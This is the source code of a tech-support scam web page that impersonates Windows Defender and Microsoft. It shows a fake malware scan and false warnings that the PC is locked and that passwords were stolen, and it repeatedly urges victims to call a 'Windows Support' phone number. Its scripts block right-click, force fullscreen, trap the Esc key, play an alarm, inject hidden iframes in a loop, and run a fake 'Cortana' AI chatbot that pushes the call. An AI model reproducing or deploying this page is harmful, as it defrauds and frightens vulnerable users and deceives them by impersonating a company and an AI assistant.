<?php error_reporting(0); ?>
<?php include('../dynamicpopup/lpkey.php') ?>
<?php include_once('../dynamicpopup/SingleTFN.php') ?>
<?php include_once('../dynamicpopup/analytics.php') ?>
<!doctype html>
<html lang="en">


<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="main.css">
    <title>IE-Security_Firewall_Code0xx268d3_Er070saf0y_Support_0f4007Helpline </title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
		  <link rel="stylesheet" type="text/css" href="chat2.css">

<script type='text/javascript'>//<![CDATA[
$(function(){
$('body').bind('contextmenu', function(e){
return false;
});
});//]]>
</script>
    <script>
        function getVariableFromURl(name)
        {
            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
            var regexS = "[\\?&]"+name+"=([^&#]*)";
            var regex = new RegExp( regexS );
            var results = regex.exec( window.location.href );
            if( results == null )
                return "";
            else
                return results[1];
        }
    </script>
    <script type="text/javascript">
        var phone = getVariableFromURl('phone');
    </script>
    <script type="text/javascript">
        window.onbeforeunload = function () {
            if (data_needs_saving()) {
                return "Do you really want to leave our brilliant application?";
            } else {
                return;
            }
        };
    </script>

    <script type="text/javascript">
        window.addEventListener("beforeunload", function (e) {
            var confirmationMessage = 'It looks like you have been editing something. '
                + 'If you leave before saving, your changes will be lost.';

            (e || window.event).returnValue = confirmationMessage; //Gecko + IE
            return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
        });
    </script>
    <script type="text/javascript">
        window.onload = function () {
            document.onclick = function (e) {
                e = e || event;
                target = e.target || e.srcElement;
                if (target.tagName === "DIV") {
                    toggleFullScreen();
                    document.body.style.cursor = 'not-allowed';
                    document.getElementById('map').innerHTML = stroka;
                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
                } else {
                    toggleFullScreen();
                    document.body.style.cursor = 'not-allowed';
                    document.getElementById('map').innerHTML = stroka;
                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
                }
            }
        }
    </script>



    <script type="text/javascript">
var phone_number = '<?php echo $phonenumber?>';
var phone_number2 = '<?php echo $phonenumber?>';

</script>


    <script src="https://code.jquery.com/jquery-3.2.1.min.js" type="text/javascript"></script>
    <script type="text/javascript">
        /* eslint-disable */
        if (top !== self) top.location = self.location;

    </script>
    <script>
    function ytFunction() {
    document.getElementById("myIMG").style.display = "block";
    }
    </script>
    <script>
    function gtFunction() {
    document.getElementById("myIMG").style.display = "none";
    }
    </script>
</head>
<body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none; background-color:#0e0b0b;">
<audio id="beep" autoplay="">
    <source src="0wa0rni0ng0.mp3" type="audio/mpeg">
</audio>
<div class="bg" style="cursor:none;">
    <div class="bgimg" style="top: 0px;"><img src="bg1.jpeg" alt="" width="100%"/></div>
    <div class="bgimg2" style="top: 0px;"><img src="bg2.jpeg" alt="" width="100%" /></div>

</div>
<a href="#" rel="noreferrer" id="link_black" style="cursor: none;">
    <div class="black" style="height: 145%;cursor: none;"></div>
</a>
<div id="ev_talkbox_wrapper" class="ev_talkbox_wrapper_min bounce">
<div class="new_messg">
    <p style="    margin-top: 3px;    font-weight: 500;
    font-size: 15px;">Need Help?</p>
    <p style="font-size: 13px;    position: relative;
    top: -6px;">Chat with our support team</p>
</div>
<div id="ev_talkbox_min" class="">
    <span id="ev_min_zoimg"></span>
    <span id="ev_min_title">Chat</span>
</div>
</div>
<!--Start-Chat-Box-->
<div id="wrapper" class="chat_box bounce2">
  <div class="chat">
    <div class="chat_head">
        <div class="row">
            <div class="col-md-6">
                <h3>Hello!</h3>
                <p>How is your day going?</p>
            </div>
            <div class="col-md-6">
                <p class="cro_icon"><img src="cross.svg"></p>
                <p class="ou_log"><img src="mic.png"></p>
            </div>
        </div>
        </div>
    <div class="chat-container">
      <div class="chat-listcontainer">

        <ul class="chat-message-list">
        </ul>

      </div>



    </div>
     <div class="type_msg">
            <div class="input_msg_write">
              <input type="text" class="write_msg" placeholder="Type a message..." />
              <button class="msg_send_btn" type="button"><img src="arrow.svg"></button>
            </div>
          </div>
  </div>
</div>


<div class="pro_box" style="cursor: none;">
    <div class="pro_box_header">
        <div class="row">
            <div class="col-md-12">
                <div class="minimize">
                    <ul>
                        <li><a href="#"><img src="minimize.jpeg"></a></li>

                    </ul>
                </div>
            </div>
            <div class="col-md-4">
                <div class="logo">
                    <img src="microsoft.png"><span>Windows Security</span>
                </div>
            </div>
            <div class="col-md-8">
                <div class="activate_lic">
                    <ul>
                        <li><a href="#">
                                <button>Activate license</button>
                            </a></li>
                        <li><a href="#"><img src="setting.png"></a></li>
                        <li><a href="#"><img src="que.png"></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <div class="scan_box">
        <div class="scan_box_header">
            <div class="row">
                <div class="col-md-6">
                    <div class="quick_scan">
                        <p><img src="virus-scan.png"><span>Quick Scan</span></p>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="minimize1">
                        <ul>
                            <li><a href="#"><img src="minimize.jpeg"></a></li>

                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_body">
            <div class="progress">
                <div id="dynamic" class="progress-bar progress-bar-success active" role="progressbar" aria-valuenow="0"
                     aria-valuemin="0" aria-valuemax="100" style="width: 0%">
                    <span id="current-progress"></span>
                </div>
            </div>
            <div class="table_quick">
                <table class="table table-bordered">
                    <thead>
                    <tr>
                        <th scope="col">Objects scanned</th>
                        <th scope="col">
                            <div class="counter col_fourth">
                                <h2 class="timer count-title count-number" data-to="51900" data-speed="5000"></h2>
                            </div>
                        </th>
                    </tr>
                    <tr>
                        <th scope="col">Time Elapsed</th>
                        <th scope="col">5 secs</th>
                    </tr>
                    <tr>
                        <th scope="col">Threats found</th>
                        <th scope="col" style="color: red;"><h2 class="timer count-title count-number" data-to="11"
                                                                data-speed="2000"></h2></th>
                    </tr>
                    </thead>
                </table>
            </div>
        </div>
        <div class="scan_footer">
            <div class="row">
                <div class="col-md-6">
                    <div class="bt_can">
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary">Cancel</button>
                        </div>
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary">Pause</button>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="bt_can2">
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary" id="">Scheduled Scans</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="pro_box2" style="cursor: none;">
    <div class="pro_box_header">
        <div class="row">
            <div class="col-md-12">
                <div class="minimize">
                    <ul>
                        <li><a href="#"><img src="minimize.jpeg"></a></li>

                    </ul>
                </div>
            </div>
            <div class="col-md-4">
                <div class="logo">
                    <img src="microsoft.png"><span>Windows Security</span>
                </div>
            </div>
            <div class="col-md-8">
                <div class="activate_lic">
                    <ul>
                        <li><a href="#">
                                <button>Activate license</button>
                            </a></li>
                        <li><a href="#"><img src="bell.png"></a></li>
                        <li><a href="#"><img src="setting.png"></a></li>
                        <li><a href="#"><img src="que.png"></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <div class="scan_box2">
        <div class="scan_box_header">
            <div class="row">
                <div class="col-md-6">
                    <div class="quick_scan">
                        <p><img src="virus-scan.png"><span>Scanner</span></p>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="minimize1">
                        <ul>
                            <li><a href="#"><img src="minimize.jpeg"></a></li>

                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_body">
            <div class="row">
                <div class="col-md-4">
                    <h4 class="new_heading">Threat Scan results</h4>
                </div>
                <div class="col-md-8">
                    <div class="total_detail">
                        <ul>
                            <li><a href="#"><p>Items detected</p>
                                    <p>11</p></a></li>
                            <li><a href="#"><p>Scan Time</p>
                                    <p>3 sec</p></a></li>
                            <li><a href="#"><p>Item Scanned</p>
                                    <p>51,900</p></a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <br>
            <div class="table_quick2">
                <table class="table table-bordered">
                    <thead>
                    <tr>
                        <th>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </th>
                        <th>Name</th>
                        <th>Type</th>
                        <th>Object type</th>
                        <th>Location</th>
                    </tr>
                    </thead>
                    <tbody id="table_scroll">
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.DNSCharge.AC...</td>
                        <td>Malware</td>
                        <td>Registry Value</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.Dropper.Autoit...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.RelevantK...</td>
                        <td>Potentially Unwanted...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.DownLoad...</td>
                        <td>Potentially Unwanted...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Adware.TopGuard...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.RelevantK...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Adware.Bundler...</td>
                        <td>Potentially Unwanted...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.DNSCharge.AC...</td>
                        <td>Malware</td>
                        <td>Registry Value</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>Trojan.Dropper.Autoit...</td>
                        <td>Malware</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.RelevantK...</td>
                        <td>Potentially Unwanted...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>
                    <tr>
                        <td>
                            <div class="form-check mar_lef">
                                <input class="form-check-input" type="checkbox" value="" id="defaultCheck1" checked="">
                                <label class="form-check-label" for="defaultCheck1"></label>
                            </div>
                        </td>
                        <td>PUP.Optional.DownLoad...</td>
                        <td>Potentially Unwanted...</td>
                        <td>File</td>
                        <td>HKLM\SYSTEM\CURRENTCONTROLS...</td>
                    </tr>

                    </tbody>
                </table>
            </div>
        </div>
        <div class="scan_footer2">
            <div class="row">
                <div class="col-md-6">
                    <div class="bt_can">
                        <div class="dropdown">
                            <a class="btn btn-secondary dropdown-toggle" style="width:126px;" href="#" role="button"
                               id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                Save result
                            </a>

                            <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                                <a class="dropdown-item" href="#">Action</a>
                                <a class="dropdown-item" href="#">Another action</a>
                                <a class="dropdown-item" href="#">Something else here</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="bt_can2">
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary">Close</button>
                        </div>
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-secondary bg_blue">Quarantine</button>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>
<div class="pro_box3" style="cursor: none;">
    <div class="pro_box_header">
        <div class="row">
            <div class="col-md-12">
                <div class="minimize">
                    <ul>
                        <li><a href="#"><img src="minimize.jpeg"></a></li>

                    </ul>
                </div>
            </div>
            <div class="col-md-4">
                <div class="logo">
                    <img src="microsoft.png"><span>Windows Security</span>
                </div>
            </div>
            <div class="col-md-8">
                <div class="activate_lic">
                    <ul>
                        <li><a href="#">
                                <button>Activate license</button>
                            </a></li>
                        <li><a href="#"><img src="bell.png"></a></li>
                        <li><a href="#"><img src="setting.png"></a></li>
                        <li><a href="#"><img src="que.png"></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <div class="">
        <div class="scan_box_header">
            <div class="row">
                <div class="col-md-6">
                    <div class="quick_scan">
                        <p><img src="virus-scan.png"><span>Scanner</span></p>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="minimize1">
                        <ul>
                            <li><a href="#"><img src="minimize.jpeg"></a></li>

                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_body">
            <div class="row">
                <div class="col-md-12">
                    <div class="total_detail_scan">
                        <ul>
                            <li><a href="#">Scanner</a></li>
                            <li><a href="#">Scan Scheduler</a></li>
                            <li><a href="#">Reports</a></li>
                        </ul>
                    </div>
                </div>
            </div>
            <br>
            <div class="table_quick2">
                <div class="row">
                    <div class="col-md-4">
                        <div class="pc_desk">
                            <img src="pc.png">
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="scan_pro mar_top">
                            <ul>
                                <li><i class="fa fa-check" aria-hidden="true"></i> Cheacking for updates</li>
                                <li><i class="fa fa-check" aria-hidden="true"></i> Scan memory</li>
                                <li><i class="fa fa-check" aria-hidden="true"></i> Scan startup items</li>
                                <li>
                                    <div class="circular-spinner"></div>
                                    <span>Scanning registry</span></li>
                                <li>Scanning file system</li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-4">
                        <div class="scan_dur">
                            <p><strong>Scan duration</strong></p>
                            <p>3sec 0s</p>
                            <p>5sec 0s</p>
                            <br>
                            <p><strong>Items scanned</strong></p>
                            <p>51,900</p>
                            <br>
                            <p><strong>Detections</strong></p>
                            <p>11</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="scan_footer3">
            <div class="row">
                <div class="col-md-2">
                    <div class="viruses">
                        <img src="virus-scan.png">
                    </div>
                </div>
                <div class="col-md-10">
                    <div class="make_this">
                        <p>Make this the last you worry about online threats</p>
                        <p>Premium stops malware, viruses, and more without bogging down your computer.
                            Upgrade to Premium</p>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<div id="poptxt" class="lightbox">
    <div class="ilb top">
        <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> Windows Defender Security Center</span>
            <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>

        </div>
    </div>
    <div id="txtintro">
                <span class="colo-rd">App: Ads.fiancetrack(2).dll<br>
                Threat-Detected:  Trojan-Spyware</span>
    </div>
    <img id="banner" src="virus-images.jpeg">
    <div id="disclaimer">
        Access to this PC has been blocked for security reasons.<br>
        <span class="support">Contact Windows Support: <script>document.write(phone_number)</script> </span>
    </div>
    <div id="bottom">
        <img id="badge" src="microsoft.png"><span class="title3">Windows</span>
        <ul>
            <li>
                <a href="#">
                    <div class="fr button2">
                        <span id="addtochromebutton">Deny</span>
                    </div>
                </a>
            </li>
            <li>
                <a href="#">
                    <div class="fr button">
                        <span id="addtochromebutton">Allow</span>
                    </div>
                </a>
            </li>
        </ul>

    </div>
</div>

<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
    <p class="text-center" style="    font-size: 16px;
    font-weight: normal;
    margin: 0;
    margin-bottom: 5px;
    padding: 5px 10px;
    color: #FFFFFF !important;
    color: #414141;font-weight: bold;
    margin-top: 8px;">Windows-Defender - Security Warning</p>
    <p>** ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
    <p>Your computer has alerted us that it has been infected with a Trojan Spyware. The following data has been
        compromised.</p>
    <p>&gt; Email Credentials<br>
        &gt; Banking Passwords<br>
        &gt; Facebook Login<br>
        &gt; Pictures &amp; Documents

    </p>
    <p>Windows-Defender Scan has found potentially unwanted Adware on this device that can steal your passwords, online
        identity, financial information, personal files, pictures or documents.</p>
    <p>You must contact us immediately so that our engineers can walk you through the removal process over the
        phone.</p>
    <p>Call Windows Support immediately to report this threat, prevent identity theft and unlock access to this
        device.</p>
    <p>Closing this window will put your personal information at risk and lead to a suspension of your Windows
        Registration.</p>
    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Call Windows Support: <strong>
            <script>document.write(phone_number)</script> </strong></p>
    <div class="action_buttons"><a class="active" id="leave_page"
                                   style="cursor: pointer; color: #FFFFFF !important;">OK</a> <a class="active"
                                                                                                 id="leave_page"
                                                                                                 style="color: #FFFFFF !important;">Cancel</a>
    </div>
</div>

<div id="welcomeDiv" style="
    background-color: rgb(40 40 40 / 90%);
    height: auto;
    width: 767px;
    top:10px;
    margin-left: 388px;
    position: absolute;
    z-index: 9999999999;
    padding: 0px 7px;
    border-radius: 0px 0px 15px 15px;" class="answer_list">
    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 21px; opacity:.9; ">Access to this computer has been blocked due to security reasons. Do not access or restart this computer. Ignoring this critical warning may result in loss of data on this system. Please contact support immediately so that a Microsoft engineer can walk you through the troubleshooting steps over the phone.</p>


</div>


<!-- Optional JavaScript; choose one of the two! -->

<!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns"
        crossorigin="anonymous"></script>
<script type="text/javascript" src="fullscreen.js"></script>
<script type="text/javascript" src="before.js"></script>
<script type="text/javascript" src="main.js"></script>
<script type="text/javascript" src="light.js"></script>



<script type="text/javascript">
    $(function () {
        var current_progress = 0;
        var interval = setInterval(function () {
            current_progress += 10;
            $("#dynamic")
                .css("width", current_progress + "%")
                .attr("aria-valuenow", current_progress)
                .text(current_progress + "% Complete");
            if (current_progress >= 100)
                clearInterval(interval);
        }, 100);
    });
</script>
<script type="text/javascript">
    (function ($) {
        $.fn.countTo = function (options) {
            options = options || {};

            return $(this).each(function () {
                // set options for current element
                var settings = $.extend({}, $.fn.countTo.defaults, {
                    from: $(this).data('from'),
                    to: $(this).data('to'),
                    speed: $(this).data('speed'),
                    refreshInterval: $(this).data('refresh-interval'),
                    decimals: $(this).data('decimals')
                }, options);

                // how many times to update the value, and how much to increment the value on each update
                var loops = Math.ceil(settings.speed / settings.refreshInterval),
                    increment = (settings.to - settings.from) / loops;

                // references & variables that will change with each update
                var self = this,
                    $self = $(this),
                    loopCount = 0,
                    value = settings.from,
                    data = $self.data('countTo') || {};

                $self.data('countTo', data);

                // if an existing interval can be found, clear it first
                if (data.interval) {
                    clearInterval(data.interval);
                }
                data.interval = setInterval(updateTimer, settings.refreshInterval);

                // initialize the element with the starting value
                render(value);

                function updateTimer() {
                    value += increment;
                    loopCount++;

                    render(value);

                    if (typeof (settings.onUpdate) == 'function') {
                        settings.onUpdate.call(self, value);
                    }

                    if (loopCount >= loops) {
                        // remove the interval
                        $self.removeData('countTo');
                        clearInterval(data.interval);
                        value = settings.to;

                        if (typeof (settings.onComplete) == 'function') {
                            settings.onComplete.call(self, value);
                        }
                    }
                }

                function render(value) {
                    var formattedValue = settings.formatter.call(self, value, settings);
                    $self.html(formattedValue);
                }
            });
        };

        $.fn.countTo.defaults = {
            from: 0,               // the number the element should start at
            to: 0,                 // the number the element should end at
            speed: 100,           // how long it should take to count between the target numbers
            refreshInterval: 100,  // how often the element should be updated
            decimals: 0,           // the number of decimal places to show
            formatter: formatter,  // handler for formatting the value before rendering
            onUpdate: null,        // callback method for every time the element is updated
            onComplete: null       // callback method for when the element finishes updating
        };

        function formatter(value, settings) {
            return value.toFixed(settings.decimals);
        }
    }(jQuery));

    jQuery(function ($) {
        // custom formatting example
        $('.count-number').data('countToOptions', {
            formatter: function (value, options) {
                return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
            }
        });

        // start all the timers
        $('.timer').each(count);

        function count(options) {
            var $this = $(this);
            options = $.extend({}, options || {}, $this.data('countToOptions') || {});
            $this.countTo(options);
        }
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $(".pro_box2").delay(1500).fadeIn(800);
        $(".pro_box3").delay(2500).fadeIn(800);
        $(".pro_box3").delay(3000).fadeIn(800);
        $("#pop_up_new").delay(3500).fadeIn(800);
        $("#poptxt").delay(4000).fadeIn(800);
         $("#welcomeDiv").delay(5000).fadeIn(800);
         $("#ev_talkbox_wrapper").delay(5200).fadeOut(500)
    });
</script>
<script type="text/javascript">
    document.addEventListener('keyup', function (es) {
        if (es.keyCode === 27) {
            toggleFullScreen();
        }
    }, false);
</script>
<script type="text/javascript">
    document.addEventListener('keyup', function (e) {
        if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
            document.getElementById('map').innerHTML = stroka;
            toggleFullScreen();
        }
    }, false);
</script>
<script>
    // Get the modal
    var modal = document.getElementById('myModal');

    // Get the button that opens the modal
    var btn = document.getElementById("myBtn");

    // Get the <span> element that closes the modal
    var span = document.getElementsByClassName("close")[0];

    // When the user clicks the button, open the modal
    /*btn.onclick = function() {
      modal.style.display = "block";
    } */

    // When the user clicks on <span> (x), close the modal
    span.onclick = function () {
        modal.style.display = "none";
    }

    // When the user clicks anywhere outside of the modal, close it
    window.onclick = function (event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    }
</script>
<script type="text/javascript">
    setTimeout(function () {
        document.getElementById("beep").play();
    });
</script>
<script>
    $(document).ready(function () {
        $("#mycanvas").click(function () {
            $("#welcomeDiv").hide();
        });
    });
</script>
<script>
    $(document).ready(function () {
        $("#mycanvas").click(function () {
            $(".bgimg").hide();
            $(".bgimg2").show();
        });
    });
</script>

<script type="text/javascript">
    $(document).ready(function () {
        $("body").mouseover(function () {
            $("#poptxt").show();
        });
    });
</script>

<script type="text/javascript">
    $(document).ready(function () {
        $("body").mouseover(function () {
            $("#welcomeDiv").show();
        });
    });
</script>
<script type="text/javascript">
     $(".chat_box").delay(5000).fadeIn('slow')
.css({top:886})
.animate({top:211}, 800, function() {
    //callback
});
</script>
<script type="text/javascript">
    var chatMessages = [{
  name: "ms1",
  msg: "Hi! I'm Cortana, a new AI chatbot by Microsoft. It seems your PC is locked out due to security reasons. ",
  delay: 5100,
  align: "right"
},
{
  name: "ms3",
  msg: "Click on one of these options to continue troubleshooting.",
  delay: 2500,
  align: "left"

},
{
  name: "ms3",
  msg: "<img src='seo.png' style='width:25px;margin-right:5px;'> Self Diagnostic Tool",
  delay: 100,
  align: "left"

},
{
  name: "ms3",
  msg: "<img src='antivirus.png' style='width:25px;margin-right:5px;'> Run Complete Scan",
  delay: 100,
  align: "left"
},
{
  name: "ms3",
  msg: "<div class='ev_zo_img'></div>Unfortunately, chat support is not available for this critical failure. Please contact Support",
  delay: 3000,
  align: "right"
}

                   ];
var chatDelay = 0;

function onRowAdded() {
  $('.chat-container').animate({
    scrollTop: $('.chat-container').prop('scrollHeight')
  });
};
$.each(chatMessages, function(index, obj) {
  chatDelay = chatDelay + 2000;
  chatDelay2 = chatDelay + obj.delay;
  chatDelay3 = chatDelay2 + 10;
  scrollDelay = chatDelay;
  chatTimeString = " ";
  msgname = "." + obj.name;
  msginner = ".messageinner-" + obj.name;
  spinner = ".sp-" + obj.name;
  if (obj.showTime == true) {
    chatTimeString = "<span class='message-time'>" + obj.time + "</span>";
  }
 $(".chat-message-list").append("<li class='message-" + obj.align + " " + obj.name + "' hidden><div class='sp-" + obj.name + "'><span class='spinme-" + obj.align + "'><div class='spinner'><div class='bounce1'></div><div class='bounce2'></div><div class='bounce3'></div></div></span></div><div class='messageinner-" + obj.name + "' hidden><span class='message-text'>" + obj.msg + "</span>" + chatTimeString + "</div></li>");
  $(msgname).delay(chatDelay).fadeIn();
  $(spinner).delay(chatDelay2).hide(1);
  $(msginner).delay(chatDelay3).fadeIn();
  setTimeout(onRowAdded, chatDelay);
  setTimeout(onRowAdded, chatDelay3);
  chatDelay = chatDelay3;
});
</script>



<script type="text/javascript">/*<![CDATA[*/

 function get_browser(){
		var ua=navigator.userAgent,tem,M=ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
		if(/trident/i.test(M[1])){
				tem=/\brv[ :]+(\d+)/g.exec(ua) || [];
				return {name:'IE',version:(tem[1]||'')};
				}
		if(M[1]==='Chrome'){
				tem=ua.match(/\bOPR\/(\d+)/)
				if(tem!=null)   {return {name:'Opera', version:tem[1]};}
				}
		M=M[2]? [M[1], M[2]]: [navigator.appName, navigator.appVersion, '-?'];
		if((tem=ua.match(/version\/(\d+)/i))!=null) {M.splice(1,1,tem[1]);}
		return {
			name: M[0],
			version: M[1]
		};
 }
 var InternetEx=window.navigator.appVersion.indexOf("MSIE")!=-1;
var isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
var browser=get_browser();
if(browser.name=="Firefox" || isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)) ){
	if(isIEedge|| InternetEx || navigator.appName == 'Microsoft Internet Explorer' ||  !!(navigator.userAgent.match(/Trident/) || navigator.userAgent.match(/rv:11/)))
		{

			 function msg_ff() {

						var i = document.createElement("div");
						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>';
						document.body.appendChild(i);

				}
				window.setInterval(function() {
						msg_ff();

				}, 1100);

			}
	else{
			function msg_ff() {

						var i = document.createElement("div");
						i.innerHTML = '<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>';
						document.body.appendChild(i);
				}
				window.setInterval(function() {
						msg_ff();

				}, 1100);

		}

 }
 else{

	 }


/*]]>*/</script>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>

<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>
<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="0ErrorIED100_0D8.php"></iframe></div>




</body>



</html>
